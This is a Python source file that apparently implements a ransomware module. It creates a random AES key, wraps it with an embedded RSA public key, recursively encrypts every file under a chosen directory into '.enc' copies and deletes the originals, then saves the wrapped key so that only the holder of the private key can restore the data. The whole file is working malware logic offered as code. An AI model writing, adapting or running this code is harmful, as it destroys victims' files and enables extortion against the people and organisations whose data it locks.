import base64
import zlib
import threading
import os
import pathlib

from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes

ENCRYPTED_FILE_NAMES = set()
PATH_TO_START_ENCRYPTION = "./Archive" # Get this value from module options
PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuNqO7IhSaA164VYRaQeq
EaKdKpBgy7ZuI7zKsGLZgehZ5/H5GZCy0fhKcdZsbbwe2stLVYCQzgTKNBA16y/a
G1xMViSbAWHZXLxyEn2GIcbmd6tEmuwuielGLtNuIx18q6WSLx8x9H4gO5EYVRkL
Gnx9xBiPkpbjUIc4qzZy9yfUO/zZ3vk4uIuXVDlWIfgf31GN+jP2R+Dx3CJxWefx
ZzAcQrmLv3BVZ0Kw0Il14Zn2YjnDI0oJr5dJV6tA6TUqMzH7Q6llwkaP3lLBSwTF
Q8EZwOaEKn7xKax/ypnYJJChr9oYDysDR0HLfaWYx9gz3AdUwSSvjKVTCmju3/pP
MQIDAQAB
-----END PUBLIC KEY-----"""

def encrypt_ransom_key(ransom_key):
    rsa_public_key = RSA.importKey(PUBLIC_KEY)
    rsa_cipher = PKCS1_OAEP.new(rsa_public_key)
    encrypted_ransom_key = rsa_cipher.encrypt(ransom_key)
    return base64.b64encode(encrypted_ransom_key).decode("ASCII")

def encrypt_file(file_name, ransom_key):
    if file_name in ENCRYPTED_FILE_NAMES or file_name[-3:] == 'enc':
        return

    aes_cipher = AES.new(ransom_key, AES.MODE_EAX)
    with open(file_name, "rb") as f:
        file_data = f.read()
        file_data_compressed = zlib.compress(file_data) 

    cipher_text, tag = aes_cipher.encrypt_and_digest(file_data_compressed)
    encrypted_data = base64.encodebytes(aes_cipher.nonce + tag + cipher_text)
    encrypted_file_name = f"{file_name}.enc"

    with open(encrypted_file_name, "wb") as f:
        f.write(encrypted_data)
    with open("encrypted_file_names.txt", "a") as f:
        f.write(encrypted_file_name + "\n")
        ENCRYPTED_FILE_NAMES.add(encrypted_file_name)
    os.remove(file_name)

def encrypt_directory(directory_name, ransom_key):
    for child in pathlib.Path(directory_name).glob("*"):
        if child.is_file():
            encrypt_file(str(child), ransom_key)
        elif child.is_dir():
            encrypt_directory(child, ransom_key)

def start_encryption(root_directory, ransom_key):
    with open("encrypted_file_names.txt", "r") as f:
        for file in f:
            ENCRYPTED_FILE_NAMES.add(file)
    
    encrypt_directory(root_directory, ransom_key)
    with open("encrypted_file_names.txt", "w") as f:
        for file in ENCRYPTED_FILE_NAMES:
            f.write(f"{file}\n")

def run(file_name, reload_interval=86400):
    ransom_key = get_random_bytes(16)
    encrypted_ransom_key = encrypt_ransom_key(ransom_key)
    threading.Thread(target=start_encryption, args=(PATH_TO_START_ENCRYPTION, ransom_key,)).start()
    return encrypted_ransom_key

if __name__ == "__main__":
    r = run(15)
    with open("hh_key.txt", "w") as f:
        f.write(r)
